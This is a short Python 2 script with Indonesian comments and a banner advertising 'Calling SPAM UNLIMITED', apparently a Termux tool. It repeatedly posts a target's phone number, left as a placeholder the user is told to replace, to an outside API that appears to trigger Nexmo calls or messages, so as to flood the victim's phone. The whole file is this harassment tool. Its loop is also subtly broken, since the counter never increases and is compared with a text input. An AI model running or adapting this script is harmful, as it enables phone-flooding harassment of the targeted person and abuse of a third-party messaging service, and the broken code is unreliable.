#!/usr/bin/python
# -*- coding: utf-8 -*-
# Ganti 62XXXXXXXXXXX ( Dengan No Target )
import requests,json,time,subprocess
import os, time
import subprocess as sp

subprocess.call("clear", shell=True)

banner = """
╔╗╴╴╴╔══════╗ \033[1;34mCalling SPAM\033[1;36m UNLIMITED\033[0m
║║╴╴╴║╴╔════╝
║╚═══╝╴╚════╗ Penyusun  : \033[1;32@thetermuxchoice01\033[0m
╚════╗╴╔═══╗║ Pendukung : Dzakira Alzena Daiva
╔════╝╴║╴╴╴║║ 
╚══════╝╴╴╴╚╝
"""

x = 0
print banner
a = raw_input("[+] Lanjutkan (y/n): ")
d = raw_input("[+] Jumlah : ")
while x < d:
   b = {"https://xxnx.com":a}
   c = " https://0x.nakocoders.org/rest-api/lain-nya/api.php?nomor=62XXXXXXXXXXX"
   e = requests.post(c, data=b)
   f = json.loads(e.text)
   if "nexmo_request_id" in f:
       print "[+] SUCESS WITH ID",f["nexmo_request_id"]
   else:
       print "[✓] Berhasil!..."
